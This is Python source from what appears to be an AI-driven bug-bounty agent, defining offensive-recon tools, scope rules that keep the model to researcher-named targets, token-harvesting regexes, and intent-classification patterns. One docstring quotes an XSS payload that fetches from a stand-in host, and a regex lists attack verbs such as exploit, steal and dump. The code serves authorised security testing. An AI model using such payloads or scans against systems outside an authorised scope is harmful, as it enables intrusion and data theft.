            "saved file into another tool, sorting/deduping it, etc.) use run_terminal_command "
            "instead — this tool is for writing content you already have in hand."
        ),
        parameters={
            "type": "object",
            "properties": {
                "filename": {"type": "string", "description": "Bare filename to save as, e.g. 'resolved_subdomains.txt' (no directory path)."},
                "content": {"type": "string", "description": "The text content to write. For a list of items, join them with newlines first."},
            },
            "required": ["filename", "content"],
        },
        executor=_execute_save_file,
    ),
    "delete_file": ToolSpec(
        name="delete_file",
        description=(
            "Delete one file you (or the researcher, via save_file) saved earlier in THIS "
            "target's own workspace — e.g. a scratch script, a one-off wordlist, an old draft "
            "no longer needed. Bare filename only, same as save_file; this can only remove a "
            "file inside this target's own storage, never anything else on the researcher's "
            "disk. Use this instead of handing back a raw `rm` command when asked to clean up "
            "something you created."
        ),
        parameters={
            "type": "object",
            "properties": {
                "filename": {"type": "string", "description": "Bare filename to delete, e.g. 'cleanup_and_note.py' (no directory path)."},
            },
            "required": ["filename"],
        },
        executor=_execute_delete_file,
    ),
    "hydra": ToolSpec(
        name="hydra",
        description="Hydra multi-engine logic & parameter anomaly analyzer — tests endpoints for logic flaws, race conditions, differential parameter handling, and broken access controls.",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Base target URL to analyze."},
                "concurrency": {"type": "integer", "description": "Number of concurrent workers (default: 10).", "default": 10},
                "enable_probing": {"type": "boolean", "description": "Enable active differential mutation probes (default: false).", "default": False}
            },
            "required": ["url"]
        },
        executor=_execute_hydra
    ),
    "cloudscout": ToolSpec(
        name="cloudscout",
        description="CloudScout cloud asset discovery — identifies AWS S3 buckets, Azure Blob storage, Google Cloud Storage buckets, and Firebase databases exposed in application responses, JS files, or endpoints.",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target base URL to scan."},
                "verify_public": {"type": "boolean", "description": "Actively check if discovered cloud storage buckets/resources are publicly accessible (default: false).", "default": False}
            },
            "required": ["url"]
        },
        executor=_execute_cloudscout
    ),
    "js_static_analysis": ToolSpec(
        name="js_static_analysis",
        description=(
            "Recover and statically audit this target's client-side JavaScript: finds and unpacks "
            "exposed sourcemaps to reconstruct original source (recovering real file names/structure "
            "from minified bundles, hunting for hardcoded secrets/API keys and endpoint paths along "
            "the way), then runs the recovered source through signature-based sink detection — "
            "eval()/dangerouslySetInnerHTML, hardcoded admin/role checks, localStorage misuse, "
            "hardcoded credentials, internal/dev URLs, client-side SQL string concatenation, insecure "
            "ws://http:// endpoints, and hidden admin/debug routes. Use this when a target is a "
            "JS-heavy SPA/bundle app and you want to see what the client-side code itself reveals, "
            "not just what the server returns — this is a different signal from spider's live-crawl "
            "endpoint discovery. Reuses this target's captured session automatically, same as every "
            "other tool here, so it can reach bundles/sourcemaps gated behind login."
        ),
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target base URL to recover and audit JS from."},
                "use_ai": {"type": "boolean", "description": "Run an extra LLM pass to verify sink findings and cut false positives (default: false — off unless explicitly asked, since it calls a separately-configured AI provider).", "default": False}
            },
            "required": ["url"]
        },
        executor=_execute_js_static_analysis
    ),
    "jsluice": ToolSpec(
        name="jsluice",
        description=(
            "JS endpoint/secret extraction via jsluice (BishopFox) — parses the actual JS AST rather than "
            "js_static_analysis/BlobUnpacker's regex-based scan, so it can catch structurally-embedded URLs and "
            "secrets that regex patterns miss. Use this when the researcher names jsluice directly, or as a "
            "second pass if js_static_analysis crashed or came back empty on JS files that are clearly there. "
            "Does NOT unpack sourcemaps the way js_static_analysis does — the two are complementary, not "
            "interchangeable. Operates on specific JS file URLs, not a whole app — pass 'js_urls' if you already "
            "know which files to check, or omit it to auto-pick up JS files spider/katana already discovered "
            "this session."
        ),
        parameters={
            "type": "object",
            "properties": {
                "js_urls": {"type": "array", "items": {"type": "string"}, "description": "JS file URL(s) to analyze. If omitted, falls back to JS files already discovered by spider/katana this session."},
                "url": {"type": "string", "description": "Shorthand for a single JS file URL (alternative to js_urls)."},
            },
            "required": []
        },
        executor=_execute_jsluice
    ),
    "transport_auditor": ToolSpec(
        name="transport_auditor",
        description="Transport & cookie security auditor — inspects SSL/TLS certificates, cipher suites, HSTS enforcement, and cookie security flags (Secure, HttpOnly, SameSite).",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target URL or hostname to audit."},
                "check_ssl": {"type": "boolean", "description": "Audit SSL/TLS certificate validity and protocol versions (default: true).", "default": True},
                "check_https": {"type": "boolean", "description": "Audit HTTPS enforcement and HSTS header presence (default: true).", "default": True},
                "check_cookies": {"type": "boolean", "description": "Audit cookie security flags on response headers (default: true).", "default": True},
                "check_payment": {"type": "boolean", "description": "Audit PCI-DSS transport requirements if payment flows detected (default: true).", "default": True}
            },
            "required": ["url"]
        },
        executor=_execute_transport_auditor
    ),
    "fuzz_hunter": ToolSpec(
        name="fuzz_hunter",
        description="Recursive path/content discovery — your default fuzzing tool, call this rather than deciding between fuzzers yourself. It automatically uses the strongest engine actually installed on this machine: feroxbuster first (purpose-built recursive discovery), then ffuf (same engine as content_discovery), and only falls back to a weaker built-in Python fuzzer with a small wordlist if neither binary is present — that fallback case is flagged in the result via 'degraded_coverage_warning' when it happens, and every result says which engine actually ran via 'engine'. You do not need to choose feroxbuster/ffuf/content_discovery manually for ordinary recursive directory fuzzing; use this first and only reach for content_discovery/vhost_fuzz directly if you specifically need raw ffuf control (e.g. a custom FUZZ position that isn't a trailing path segment).",
        parameters={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target base URL to fuzz."},
                "max_depth": {"type": "integer", "description": "Maximum recursive discovery depth (default: 2).", "default": 2},
                "threads": {"type": "integer", "description": "Concurrent HTTP workers (default: 10).", "default": 10},
                "quick": {"type": "boolean", "description": "Quick mode with top-priority wordlist paths only (default: false). Only affects the internal fallback engine — feroxbuster/ffuf always use the full real wordlist.", "default": False},
                "rate_limit": {"type": "integer", "description": "Max requests/sec (default: the configured fuzz_rate_limit, normally 150). Recursion multiplies request volume fast, so this matters more here than for a single-pass fuzz. Pass 0 to go uncapped -- only do this on a disposable CTF/lab box, never a live or production target."}
            },
            "required": ["url"]
        },
        executor=_execute_fuzz_hunter
    ),
    "set_target": ToolSpec(
        name="set_target",
        description=(
            "Declare the host/domain/IP the researcher wants you to actively hunt against, switching the active "
            "session to it. Call this ONLY when the researcher's message is actually directing you to test, scan, "
            "recon, or hunt a specific host — never when a domain merely appears in the message as an example, a "
            "quoted payload, part of an email address, something being asked ABOUT rather than asked to be tested, "
            "or unrelated conversation. When in doubt, don't call it — answer conversationally instead (you can "
            "always call it on a later turn once the researcher confirms). No network/recon tool can run until a "
            "real target is set this way (or via /target or /scope). IMPORTANT: if the researcher's message names "
            "MULTIPLE hosts belonging to the SAME engagement up front (e.g. 'me.agov.admin.ch is the main app, "
            "auth.agov.admin.ch is the auth server, idp.agov.admin.ch is the identity provider'), pass every one of "
            "those additional hosts in 'related_hosts' on THIS call — don't just set the primary one and hope to "
            "remember to add the rest later with manage_scope, that's what caused real blocked-tool-call friction "
            "before. Only include hosts the researcher ACTUALLY named this way, never a guess at what else might "
            "be related. IMPORTANT — rotating-IP labs (THM/HTB-style): if the researcher says this new host is "
            "the SAME target as one you already set (e.g. 'the IP is dead, use this IP now', 'same box, new IP', "
            "'it respawned, here's the new address' — anything saying 'same machine/target/box', not a genuinely "
            "new, unrelated host), pass the PREVIOUS host/IP in 'same_target_as' on this call. That carries "
            "forward everything already learned (findings, notes, fingerprinted plugins/users/tech, the login "
            "recipe) onto the new host instead of silently starting over from zero and forcing the researcher to "
            "re-explain the whole site a second time."
        ),
        parameters={
            "type": "object",
            "properties": {
                "host": {"type": "string", "description": "The exact domain, hostname, or IP (with optional :port) the researcher wants tested — copied verbatim from their message, not reconstructed from memory."},
                "reason": {"type": "string", "description": "One short phrase: what in the researcher's message makes this an actual hunting target (e.g. 'researcher said \"start recon on acme.com\"'), for the audit trail."},
                "related_hosts": {
                    "type": "array", "items": {"type": "string"},
                    "description": "Other hosts the researcher named in the SAME message as part of this engagement (auth server, IdP, API subdomain, etc.) — pre-authorizes them into scope alongside the primary host so you don't hit a SCOPE_VIOLATION the first time you need to touch one. Only hosts the researcher actually named, never inferred ones.",
                },
                "same_target_as": {
                    "type": "string",
                    "description": "The PREVIOUS host/IP this new 'host' replaces, when the researcher is saying it's the same logical target under a new address (IP rotated after a lab machine restarted/respawned). Carries findings/notes/fingerprinted tech/login-recipe forward onto the new target; live session cookies are dropped (presumed dead after a restart). Leave unset for a genuinely new, unrelated target.",
                },
            },
            "required": ["host"]
        },
        executor=_execute_set_target_stub
    ),
}


# Set True the first time register_mcp_servers() runs (see Agent.handle_message)
# so a long-lived process only ever dials configured MCP servers once, not
# on every single turn.
_MCP_SERVERS_REGISTERED = False


def _make_mcp_executor(call_fn: Callable[..., Dict[str, Any]]) -> Callable[[Dict[str, Any], Target, Any], Dict[str, Any]]:
    """
    Adapts an MCP/Caido tool's (args[, emit]) -> dict call signature to the
    (args, target, emit) -> dict shape every other ToolSpec executor uses.
    target is unused deliberately: the MCP server (Burp, or whatever else
    gets configured) manages its own notion of state — bounty-hunter
    doesn't inject target/session context into an MCP call the way it does
    for its own curl-based tools, since the server on the other end (e.g.
    Burp itself) is the one actually making the HTTP request and has its
    own project/scope configuration.

    emit IS passed through now (it wasn't originally) — mcp_bridge.py's
    call_tool_with_reconnect uses it to surface "[!] connection lost —
    reconnecting..." to the researcher live instead of that only showing up
    in a log nobody's watching. Caido's call closures accept and ignore it
    (no reconnect concept there — see caido_bridge.py), so this works for
    both without special-casing which kind of integration a given tool
    came from.
    """
    def _executor(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
        return call_fn(args, emit)
    return _executor


def register_mcp_servers(emit: Any = None) -> int:
    """
    Reads mcp_servers from config (~/.hellhound/config.json's "mcp_servers"
    key — see ai_utils.load_config), connects to each configured server,
    and registers every tool it exposes into TOOL_REGISTRY under the name
    'mcp_<server>_<tool>' (prefixed so e.g. Burp's own 'send_to_repeater'
    can never collide with a built-in tool of the same name, and so it's
    always visible in logs/history which backend actually ran a call).

    Example config.json entry for Burp's MCP tab (recent Burp: native,
    Streamable HTTP; older standalone PortSwigger extension JAR: legacy
    SSE at /sse — both exist in the wild, which is why `/mcp burp` probes
    for the right one instead of hardcoding either):

        "mcp_servers": {
            "burp": {"transport": "streamable_http", "url": "http://127.0.0.1:9876/mcp"}
        }

    (or {"transport": "sse", "url": "http://127.0.0.1:9876/sse"} for the
    older extension — don't hand-edit this; use `/mcp burp` and let it
    resolve and save the right one.)

    Best-effort and non-fatal: a server that's misconfigured, not running,
    or not installed simply contributes zero tools for this session (with
    a warning via emit, if given) — it never prevents bounty-hunter itself
    from starting. Safe to call more than once; servers already connected
    this process are not reconnected.
    """
    try:
        from hellhound.core.mcp_bridge import connect_mcp_server, _bridges
    except ImportError:
        if emit and hasattr(emit, "warn"):
            emit.warn("[!] MCP support unavailable — install the 'mcp' package (pip install mcp) to use mcp_servers config.")
        return 0

    cfg = load_config()
    servers = cfg.get("mcp_servers") or {}
    if not isinstance(servers, dict) or not servers:
        return 0

    total_registered = 0
    for server_name, server_cfg in servers.items():
        if not isinstance(server_cfg, dict):
            continue
        if server_name in _bridges:
            continue  # already connected this process
        discovered = connect_mcp_server(server_name, server_cfg, emit=emit)
        for tool in discovered:
            registry_name = f"mcp_{server_name}_{tool.name}"
            if registry_name in TOOL_REGISTRY:
                if emit and hasattr(emit, "warn"):
                    emit.warn(f"[!] MCP tool '{registry_name}' collides with an existing tool name — skipped.")
                continue
            TOOL_REGISTRY[registry_name] = ToolSpec(
                name=registry_name,
                description=f"[MCP:{server_name}] {tool.description}",
                parameters=tool.parameters,
                executor=_make_mcp_executor(tool.call),
            )
            total_registered += 1
    return total_registered


# Set True the first time register_caido_tools() runs — same one-shot
# contract as _MCP_SERVERS_REGISTERED above.
_CAIDO_TOOLS_REGISTERED = False


def register_caido_tools(emit: Any = None) -> int:
    """
    Reads the "caido" block from config.json and registers Caido's tools
    (caido_http_history_search, caido_send_request, caido_create_finding —
    see hellhound/core/caido_bridge.py) into TOOL_REGISTRY. Caido has no
    MCP server of its own (unlike Burp), so this isn't an MCP connection —
    caido_bridge.py talks to Caido's local GraphQL API directly.

    Example config.json entry (the token comes from Caido's own devtools:
    log into Caido, open devtools, and in the console run
    `JSON.parse(localStorage.CAIDO_AUTHENTICATION).accessToken` — it
    expires after 7 days, so this needs re-pasting occasionally):

        "caido": {
            "url": "http://localhost:8080/graphql",
            "token": "<access token>"
        }

    Best-effort and non-fatal, same contract as register_mcp_servers():
    an unreachable/expired/misconfigured Caido instance contributes zero
    tools (with a warning via emit, if given) and never blocks startup.
    """
    try:
        from hellhound.core.caido_bridge import register_caido_tools as _discover_caido_tools
    except ImportError:
        if emit and hasattr(emit, "warn"):
            emit.warn("[!] Caido support unavailable — install the 'requests' package to use the caido config block.")
        return 0

    cfg = load_config()
    caido_cfg = cfg.get("caido")
    if not caido_cfg:
        return 0

    discovered = _discover_caido_tools(caido_cfg, emit=emit)
    total_registered = 0
    for tool in discovered:
        registry_name = f"caido_{tool['name']}" if not tool["name"].startswith("caido_") else tool["name"]
        if registry_name in TOOL_REGISTRY:
            if emit and hasattr(emit, "warn"):
                emit.warn(f"[!] Caido tool '{registry_name}' collides with an existing tool name — skipped.")
            continue
        TOOL_REGISTRY[registry_name] = ToolSpec(
            name=registry_name,
            description=f"[Caido] {tool['description']}",
            parameters=tool["parameters"],
            executor=_make_mcp_executor(tool["call"]),
        )
        total_registered += 1
    return total_registered


# Capability fast-path removed to allow natural LLM responses


# ==========================================================
# AGENT REASONING & EXECUTION LOOP
# ==========================================================

def extract_path_scope(user_text: str) -> Optional[str]:
    """
    If the user's task text names a specific URL (e.g. "...from this endpoint https://host/app"),
    return that first path segment (e.g. "/app") as the task's path scope.

    Multi-tenant hosts (several independent applications or challenges living under
    different top-level paths on the same domain) — a task scoped to one endpoint should
    not wander into the others. Returns None if no explicit full URL path is present
    so an existing established target path scope is not accidentally overwritten by casual path mentions.
    """
    if not user_text:
        return None
    # 1. Full URL check (e.g. https://host/pulse or http://target/app/login)
    m = re.search(r'https?://[^\s"\']+', user_text)
    if m:
        raw_url = m.group(0).rstrip(".,;:!?)>\"'")
        try:
            parsed = urlparse(raw_url)
            path = parsed.path or ""
            segments = [s.strip(".,;:!?)>\"'") for s in path.split("/") if s.strip(".,;:!?)>\"'")]
            if segments:
                return "/" + segments[0]
        except Exception:
            pass

    # 2. Explicit scope specification command (e.g. "scope /app", "target /pulse")
    m_path = re.search(r'(?:scope|target|path)\s+(/[a-zA-Z0-9_\-\.]+)', user_text, re.IGNORECASE)
    if m_path:
        cand = m_path.group(1).rstrip(".,;:!?)>\"'")
        segments = [s for s in cand.split("/") if s]
        if segments and segments[0].lower() not in ("setup", "scope", "target", "recon", "help", "clear", "quit", "exit", "root", "api"):
            return "/" + segments[0]

    return None


def _url_in_path_scope(url: str, path_scope: str) -> bool:
    """True if url's path falls under path_scope (e.g. '/app')."""
    try:
        p = (urlparse(url).path or "").rstrip("/")
        scope = path_scope.rstrip(".,;:!?)>\"'").rstrip("/")
    except Exception:
        return True
    return p == scope or p.startswith(scope + "/")


def _strip_payload_context(text: str) -> str:
    """
    Strips code/markup spans that are almost certainly payload or example
    content being discussed — an XSS/SQLi/SSRF string, a PoC snippet — not
    an actual target designation. Without this, a question like 'is my
    payload "<img src=x onerror=\"fetch(\'http://host/x\')\">" correct?' has
    its embedded URL extracted as THE target, silently switching the agent
    into live recon/attack mode against a host the researcher never asked
    to be hit — they asked whether a string was well-formed, nothing more.
    Run before target extraction so payload content can't railroad it.
    """
    if not text:
        return text
    cleaned = text
    # Fenced code blocks and inline code spans — almost always examples/PoCs.
    cleaned = re.sub(r'```[\s\S]*?```', ' ', cleaned)
    cleaned = re.sub(r'`[^`]*`', ' ', cleaned)
    # HTML/markup payload span: strip everything from the first '<' to the
    # last '>' in the message. A quote-pairing regex can't reliably parse
    # this — HTML attributes routinely nest a quote inside a quote (e.g.
    # onerror="fetch('...')" sitting inside an outer-quoted "<img ...>"),
    # which breaks simple non-nested quote matching but doesn't matter at
    # all here: bracket-bounding just removes the whole tag-like span,
    # URL and all, regardless of what quoting is inside it.
    first_lt = cleaned.find('<')
    last_gt = cleaned.rfind('>')
    if first_lt != -1 and last_gt != -1 and last_gt > first_lt:
        cleaned = cleaned[:first_lt] + ' ' + cleaned[last_gt + 1:]
    # Email addresses — a user describing what a site returns/accepts
    # ("returns a session for {\"email\":\"noob@gmail.com\"}") is quoting
    # example data, not naming gmail.com as the target. Without this, the
    # domain half of any email mentioned in chat gets picked up by the
    # domain regex below (word-boundary matches right after '@') and set
    # as the active target, which then silently launches the full recon/
    # tool loop against a real third-party host the user never asked to
    # scan and never confirmed via /scope.
    cleaned = re.sub(r'\b[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}\b', ' ', cleaned)
    return cleaned


def _extract_first_balanced_json(text: str) -> Optional[dict]:
    """
    Find the first '{' in text and parse the balanced JSON object it opens,
    by scanning brace depth (string/escape-aware) rather than regex-matching
    greedily to the LAST '}' anywhere in the text.

    Without this, a tool-call response with one stray trailing character
    after an otherwise well-formed object — e.g. the model emitting
    '{"tool": "curl", "args": {...}}}' with one extra closing brace, seen in
    practice on payload-heavy args like an XSS string containing its own
    parens/braces — makes the old greedy `\\{[\\s\\S]*\\}` regex capture that
    trailing junk too, so json.loads fails on the whole thing, the tool call
    is silently dropped, and the raw malformed JSON was falling through
    every guard (it doesn't match any narration keyword either) straight to
    the user as the "final answer" instead of ever executing or retrying.
    """
    start = text.find("{")
    if start == -1:
        return None
    depth = 0
    in_string = False
    escape = False
    for i in range(start, len(text)):
        ch = text[i]
        if in_string:
            if escape:
                escape = False
            elif ch == "\\":
                escape = True
            elif ch == '"':
                in_string = False
            continue
        if ch == '"':
            in_string = True
        elif ch == "{":
            depth += 1
        elif ch == "}":
            depth -= 1
            if depth == 0:
                candidate = text[start:i + 1]
                try:
                    parsed = json.loads(candidate)
                    return parsed if isinstance(parsed, dict) else None
                except Exception:
                    return None
    return None


def _extract_all_tool_calls(text: str) -> List[dict]:
    """
    Like _extract_first_balanced_json, but keeps scanning past the first
    match and returns EVERY top-level balanced {...} object in the text
    that parses as a dict with a "tool" key — in encounter order.

    Small/local orchestrator models frequently batch several tool calls
    into one response instead of emitting exactly one, e.g.:

        {"tool": "curl", "args": {...}} {"tool": "curl", "args": {...}} {"tool": "curl", "args": {...}}

    Before this, only the FIRST object was ever extracted and executed;
    everything after it was silently discarded mid-turn. Worse, once the
    narration-retry budget was spent re-asking for "just one clean JSON
    object" (which the model kept failing to produce, since it was never
    wrong about wanting multiple calls — just about the framing), the
    turn gave up and handed the synthesizer a history full of these raw
    unexecuted blobs, which it then echoed back verbatim as the "final
    answer" — the exact "nothing ran, say continue" loop this exists to
    break.
    """
    results: List[dict] = []
    i = 0
    n = len(text)
    while i < n:
        start = text.find("{", i)
        if start == -1:
            break
        depth = 0
        in_string = False
        escape = False
        end = -1
        j = start
        while j < n:
            ch = text[j]
            if in_string:
                if escape:
                    escape = False
                elif ch == "\\":
                    escape = True
                elif ch == '"':
                    in_string = False
            else:
                if ch == '"':
                    in_string = True
                elif ch == "{":
                    depth += 1
                elif ch == "}":
                    depth -= 1
                    if depth == 0:
                        end = j + 1
                        break
            j += 1
        if end == -1:
            # Unbalanced from here on — nothing more to find.
            break
        candidate = text[start:end]
        try:
            parsed = json.loads(candidate)
            if isinstance(parsed, dict) and "tool" in parsed:
                results.append(parsed)
        except Exception:
            pass
        i = end
    return results


def extract_target_from_text(user_text: str) -> Optional[str]:
    """
    Finds a domain/IP/host-shaped candidate in user text — used ONLY as a
    cheap pre-filter (see has_real_target in Agent.handle_message) to decide
    whether a message is worth loading the full tool-calling orchestrator
    prompt for. It does NOT set the active target anymore. Switching the
    active target is now a decision the orchestrator model itself makes, via
    the `set_target` tool, after actually reading the message for whether
    the researcher is directing it to hunt that host — not from a regex
    match. (This function used to double as the auto-target-setter; that
    caused the domain half of any email address mentioned in chat, e.g.
    'noob@gmail.com', to get silently promoted to THE active target and
    launch live recon against it. A false positive here now just means an
    extra turn loads the tool prompt for what turns out to be a
    conversational message — cheap, and the model still answers "DONE".)
    Handles:
    - Full URLs: http://10.49.135.46/ -> 10.49.135.46
    - IPv4 addresses: 10.49.135.46, 192.168.1.1:8080
    - Standard domain names: example.com, sub.target.ctf.io
    - Local hostnames: localhost, htb.local
    Payload/code content (quoted HTML/JS snippets, code blocks, email
    addresses) is stripped before matching — see _strip_payload_context.
    """
    if not user_text:
        return None
    scan_text = _strip_payload_context(user_text)
    url_match = re.search(r'https?://([a-zA-Z0-9._-]+(?::\d+)?)', scan_text)
    if url_match:
        return url_match.group(1)
    ip_match = re.search(r'\b(?:\d{1,3}\.){3}\d{1,3}(?::\d+)?\b', scan_text)
    if ip_match:
        return ip_match.group(0)
    # Domain suffix must be a real TLD — "word.word" alone is not enough.
    # Without this check, any two words separated by a period in an
    # ordinary sentence ("Dr.Doom", "Mr.Robot", "vs.us") gets treated as a
    # legitimate scan target, which is how a casual pop-culture question
    # about a fictional character ends up running subfinder and DNS
    # bruteforce against it. This covers the TLDs that actually show up in
    # real bug bounty/CTF targets — not exhaustive of every IANA TLD, but
    # explicitly NOT "any short alphabetic string after a dot."
    _COMMON_TLDS = (
        "com", "net", "org", "io", "dev", "app", "co", "gov", "edu", "mil",
        "info", "biz", "xyz", "live", "site", "online", "tech", "cloud",
        "security", "ai", "me", "tv", "cc", "local", "ctf", "htb", "lab",
        "us", "uk", "de", "in", "au", "ca", "fr", "jp", "nl", "eu", "ru",
        "br", "it", "es", "cn", "kr", "id", "za", "mx", "ch", "se", "no",
        "fi", "dk", "pl", "be", "at", "nz", "ie", "sg", "hk", "tw", "il",
    )
    # Negative lookbehind for '@' — belt-and-suspenders against email
    # domains reaching this point (the primary fix strips whole email
    # addresses in _strip_payload_context above; this catches any caller
    # that hands raw, unstripped text straight to this function).
    dom_match = re.search(r'(?<!@)\b([a-zA-Z0-9][-a-zA-Z0-9]*(?:\.[a-zA-Z0-9][-a-zA-Z0-9]*)*\.([a-zA-Z0-9]{2,}))\b', scan_text)
    if dom_match and dom_match.group(2).lower() in _COMMON_TLDS:
        return dom_match.group(1)
    local_match = re.search(r'\b(localhost|htb\.local)\b', scan_text, re.IGNORECASE)
    if local_match:
        return local_match.group(0)
    return None


def _extract_preserved_artifacts(content: str) -> str:
    """
    Scans untruncated tool output content for high-value security artifacts
    (JWTs, Bearer tokens, Session/API keys, URLs, Emails) and returns a formatted
    [PRESERVED ARTIFACTS ...] header block, or empty string if none found.
    """
    if not content:
        return ""

    jwts = sorted(set(re.findall(r"eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+", content)))
    bearer_tokens = sorted(set(re.findall(r"Bearer\s+[A-Za-z0-9._~+/-]+=*", content)))
    session_keys = sorted(set(re.findall(r"(?:session|sid|token|auth|api[_-]?key)[\"'=:\s]+[A-Za-z0-9._-]{8,}", content, re.IGNORECASE)))
    urls = sorted(set(re.findall(r"https?://[^\s\"'<>]+", content)))
    emails = sorted(set(re.findall(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", content)))

    lines = []
    if jwts:
        lines.append(f"JWTs: {', '.join(jwts)}")
    if bearer_tokens:
        lines.append(f"Bearer tokens: {', '.join(bearer_tokens)}")
    if session_keys:
        lines.append(f"Session/API keys: {', '.join(session_keys)}")
    if urls:
        lines.append(f"URLs: {', '.join(urls)}")
    if emails:
        lines.append(f"Emails: {', '.join(emails)}")

    if not lines:
        return ""

    header = "[PRESERVED ARTIFACTS — extracted before truncation, may include entries from the cut middle section]\n"
    return header + "\n".join(lines) + "\n\n"


_CONVERSATIONAL_STARTERS = re.compile(
    r'^\s*(why|what|who|how|when|where|explain|tell me|can you explain|damn|dam|wow|nice|'
    r'good|great|awesome|thanks|thank you|lol|lmao|haha|nvm|never\s*mind|'
    # Greetings — previously missing, so a plain "hi"/"hey" with a target
    # already set (has_real_target) fell through to the full orchestrator
    # loop (heavy TARGET/SCOPE/tools system prompt) instead of the fast
    # casual-synthesis path, turning a one-word greeting into two full LLM
    # round-trips. classify_intent() in ai_utils.py already special-cased
    # these same words as "chat" but was never wired into this gate — it's
    # dead code; this is the actual gate that matters.
    r'hi|hey|hello|yo|sup|howdy|greetings|morning|evening|afternoon)\b',
    re.I
)
_ACTION_VERBS = re.compile(
    r'\b(try|test|attempt|access|exploit|register|log\s*in|login|find|get|hack|scan|curl|'
    r'probe|crawl|enumerate|brute\s*force|inject|forge|bypass|escalate|dump|extract|steal|'
    r'take\s*over|takeover|check\s+if|verify\s+if|confirm\s+if|continue|keep\s+going|resume|'
    r'next\s+step|do\s+it|go\s+ahead|proceed|run\b)\b',
    re.I
)
_RETROSPECTIVE_MARKERS = re.compile(
    r'^\s*(why\s+did\s+you|why\s+(did|does|is|was)\s+(he|it|that)|what\s+made\s+you|'
    r'did\s+you|have\s+you|what\s+did\s+you|how\s+did\s+you)\b',
    re.I
)
_NEW_TARGET_SIGNAL = re.compile(
    r'(https?://|your target is|\bthe target\b|\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', re.I
)


def _confidently_conversational(text: str) -> bool:
    """
    A deterministic, code-level pre-gate — checked BEFORE the orchestrator
    loop is entered at all, not inside its prompt. Deliberately asymmetric:
    it can only confidently say "skip tools, this is pure conversation,"
    never "force tools, this is definitely an instruction." The forcing
    side always stays with the model's own judgment — this only closes the
    specific, repeatedly-observed gap (explain/recap/praise turns still
    running tools), it doesn't reduce flexibility for real instructions,
    ambiguous phrasing, or creative task framing, which all still reach the
    model's full reasoning exactly as before. If in doubt, this returns
    False and the turn proceeds through the orchestrator as usual.
    """
    t = text.strip()
    if not t:
        return False
    if _NEW_TARGET_SIGNAL.search(t):
        return False
    # A retrospective question ("why did you try X", "what made you do
    # that") legitimately contains an action-verb WORD describing something
    # already done, not a new instruction to do it — don't let that block
    # the conversational classification the way a bare "register" or
    # "try X" (an actual new imperative) correctly should.
    is_retrospective = bool(_RETROSPECTIVE_MARKERS.match(t))
    if _ACTION_VERBS.search(t) and not is_retrospective:
        return False
    return bool(_CONVERSATIONAL_STARTERS.match(t))


class Agent:
    # ── Rolling memory digest thresholds ────────────────────────────────
    # Raw self.history entries carry full-fidelity content (tool results up
    # to 25k chars each — see _get_trimmed_history). Left unbounded, that
    # gets resent on every future turn, including a plain "hi", which is
    # what actually made turns slow after a session ran real recon. Once
    # the raw log passes _HISTORY_COMPACT_TRIGGER entries, everything
    # older than the most recent _HISTORY_KEEP_RAW is folded into a terse
    # narrative digest (session_digest) and dropped from self.history —
    # the digest rides along in the system prompt instead, at a fraction
    # of the size.
    # These were sized (14/8/4000) for a small-context local orchestrator
    # model — tight enough that a single real engagement (ShopHaven-style:
    # login, spider, a handful of curl probes, a password-reset exploit
    # chain) could blow past _HISTORY_COMPACT_TRIGGER and get its own
    # exact evidence (the leaked reset token, the exact request that
    # worked) folded into a lossy 4000-char digest before the turn that
    # needed to write the report ever ran — the synthesizer then has to
    # reconstruct specifics from a summary instead of the real tool
    # output. Now that the default synthesizer/orchestrator model carries
    # a ~1M-token context window, there's no reason to compact this
    # aggressively — raised to comfortably cover a full single-target
    # engagement's worth of raw tool output before anything gets folded.
    _HISTORY_COMPACT_TRIGGER = 48
    _HISTORY_KEEP_RAW = 30
    _DIGEST_CHAR_CAP = 12000

    def __init__(self, target: Optional[Target] = None):
        self.target = target or create_or_load_target("default")
        self.history: List[Dict[str, str]] = self.target.state.get("history") or []
        if not isinstance(self.history, list):
            self.history = []
        # Condensed rolling memory of everything older than the raw window
        # above — per-target (stored in target.state), so a brand-new
        # target/session never inherits another investigation's digest or
        # history. See _compact_history_if_needed().
        self.session_digest: str = self.target.state.get("session_digest") or ""
        # Guards background compaction (see _compact_history_if_needed) so
        # a second trigger firing while one summarization pass is still in
        # flight skips instead of stacking up concurrent LLM calls.
        self._compaction_lock = threading.Lock()
        self.guard = AutopilotGuard(
            circuit_threshold=5,
            circuit_cooldown=60.0,
            recon_rps=10.0,
            test_rps=1.0,
            safe_methods_only=True
        )
        self._turn_path_scope: Optional[str] = None  # e.g. "/app" — set per-turn in handle_message
        self._forced_skill: Optional[str] = None  # set by /skill-name slash command — one-shot, consumed next turn
        self._active_session_context: Optional[Dict[str, Any]] = None  # this turn's session_context, if any — see set_target()
        self._auto_continue_streak: int = 0  # consecutive auto-continued turns this process, in-memory only — see the AUTO-CONTINUE DECISION block in handle_message
        self._last_turn_auto_continue: bool = False  # read by the CLI loop right after handle_message() returns to decide whether to auto-send "continue"

    def _compact_history_if_needed(self) -> None:
        """
        Trims old raw turns out of self.history immediately — synchronous,
        cheap, no I/O — which is what actually keeps future prompts small.
        The folded-out turns are then handed to a BACKGROUND thread for
        digest summarization + lesson mining, since those are LLM calls
        and must never block the response the researcher is waiting on.

        (An earlier version of this ran those two LLM calls inline, right
        before returning the answer. Once history passed the trigger,
        every turn paid for two sequential slow API calls before the
        researcher saw anything — a multi-hundred-second hang on what
        should've been an instant reply. That was the actual bug behind
        "still responding late." Fixed by making enrichment strictly
        best-effort and asynchronous — it can lag a turn or two behind
        without costing the researcher anything.)
        """
        if len(self.history) <= self._HISTORY_COMPACT_TRIGGER:
            return

        cutoff = len(self.history) - self._HISTORY_KEEP_RAW
        to_fold = self.history[:cutoff]
        remaining = self.history[cutoff:]
        if not to_fold:
            return

        # The size fix happens right here, synchronously — everything below
        # is enrichment and must not gate it.
        self.history = remaining

